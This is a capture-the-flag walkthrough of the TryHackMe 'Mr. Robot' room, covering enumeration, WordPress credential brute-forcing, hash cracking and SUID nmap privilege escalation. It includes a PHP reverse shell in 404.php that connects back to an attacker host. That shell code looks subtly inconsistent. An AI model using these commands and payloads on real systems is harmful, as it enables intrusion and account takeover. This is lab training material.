// Overview

Mr. Robot is a classic TryHackMe room inspired by the TV series. It offers a great challenge for beginners and intermediate users. This CTF tests web enumeration, WordPress exploitation, hash cracking, and Linux privilege escalation. The room is rated Medium and provides a strong introduction to the penetration testing process.

The room includes:

  • Web enumeration and directory brute-forcing
  • WordPress admin access through credential brute-forcing
  • Reverse shell using WordPress theme editing
  • MD5 hash cracking with John the Ripper
  • SUID binary exploitation for root access

// Phase 1: Reconnaissance

We start with a standard Nmap scan. The -sC flag runs default scripts, -sV detects versions, and the -p- flag scans all 65,535 ports.

nmap -sC -sV -p- <target_ip>

Three ports are open:

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd

Visiting the website on port 80 reveals a cool interactive page themed after the Mr. Robot show. The page doesn't give away any information right away, so we need to dig deeper.

We run gobuster to find hidden directories:

gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt

The scan reveals several interesting directories. Among them, we find:

/robots               (Status: 200)
/wp-admin             (Status: 301)
/wp-login             (Status: 200)
/wp-content           (Status: 301)
Pro Tip: Always check robots.txt early. It often has hidden paths or files that the developer doesn't want search engines to index, but they can be useful for us.

// Phase 2: Discovering the Wordlist

Accessing http://<target_ip>/robots.txt reveals: 

User-agent: *
fsocity.dic
key-1-of-3.txt

There are two files listed. The fsocity.dic file is a large wordlist, and key-1-of-3.txt contains the first flag.

We grab the first key:

Key 1 0734...

The wordlist fsocity.dic will be useful later. We download it: 

wget http://<target_ip>/fsocity.dic

// Phase 3: WordPress Enumeration

We found /wp-login during enumeration, which is a WordPress login page. WordPress has a useful feature: it explains why the login failed.

WordPress Error Messages:
  • "Invalid username" means the username doesn't exist
  • "Invalid password" means the username exists, but the password is wrong.
This is a common information disclosure vulnerability.

We used Hydra to list valid usernames with the fsocity.dic wordlist:

hydra -L fsocity.dic -p anything 10.113.143.152 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username"

Hydra quickly found the username: Elliot WordPress is case-insensitive, so variations like "elliot" and "ELLIOT" also work.

For the password brute-force, we switched to wpscan:

wpscan --url http://10.113.143.152 -U Elliot -P fsocity.dic
Why wpscan? WordPress's XML-RPC API allows system.multicall, which tests multiple passwords in a single request. This made wpscan much faster, taking about 47 minutes vs. Hydra's roughly 5.5 hours.

The scan found the password:

[SUCCESS] - Elliot / ER28-0652

// Phase 4: Getting a Reverse Shell

With the credentials Elliot / ER28-0652, we log in to the WordPress admin panel at http://<target_ip>/wp-admin.

In the WordPress admin, we go to:

  • Appearance → Editor
  • Select the 404 Template (404.php) from the right sidebar.

We replace the entire content of 404.php with a PHP reverse shell. The PentestMonkey one-liner works well:

<?php
set_time_limit(0);
$ip = '<attacker_ip>';
$port = 4444;
$ch = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($ch, $ip, $port);
exec("/bin/sh -i <&3 >&3 2>&3");
?>

Before saving, we set up a netcat listener on our attacker machine:

nc -lvnp 4444

To trigger the shell, we visit a non-existent page on the site, which forces it to load the 404 template:

curl http://<target_ip>/blah

The connection is caught, and we have a shell as the daemon user.

404 Template Injection: WordPress's theme editor is a common attack point. If you have admin access, you can change any theme file, including error pages, to run arbitrary code.

// Phase 5: Privilege Escalation

We now have a shell as daemon. We need to become robot to read the second flag.

First, we check the /home/robot directory:

ls -la /home/robot

We find a file named password.raw-md5 that contains an MD5 hash:

cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

Next, we copy the hash to a file and use John the Ripper to crack it:

john --format=Raw-MD5 robot_hash.txt --wordlist=fsocity.dic

The password is cracked as: abcdefghijklmnopqrstuvwxyz

Now, we switch to the robot user: 

su robot
Password: abcdefghijklmnopqrstuvwxyz

We read the second flag:

Key 2 822c...

Next, we need root access. We check for SUID binaries:

find / -perm -4000 -type f 2>/dev/null

One binary stands out: /usr/local/bin/nmap. This is an older version of Nmap that has a known vulnerability.

We run Nmap in interactive mode and spawn a shell:

/usr/local/bin/nmap --interactive
map> !sh

This gives us a root shell. We read the final flag:

cd /root
cat key-3-of-3.txt
Key 3 0478...
SUID Binaries: The nmap --interactive privilege escalation is a classic CTF technique. Older versions of Nmap (pre-5.0) had this vulnerability. Always check for SUID binaries and research any that seem out of date.

// Key Takeaways

Wordlists serve multiple purposes. The fsocity.dic file acted as both a username list and a password list. Always think about how you might repurpose a wordlist.
Patience is important. The 47-minute wpscan brute force teaches persistence. In pentesting, you must use your time effectively.
WordPress is often targeted. The theme editor is a common attack point. Knowing how to manage WordPress is key for testing web applications.
SUID binaries hold a lot of power. Always run find / -perm -4000 -type f 2>/dev/null on Linux machines. You never know which outdated binary might give you root access.
Dodge, duck, dip, dive, and... dodge? This room is a great way to learn the classic CTF approach: enumerate, exploit, escalate, and document.
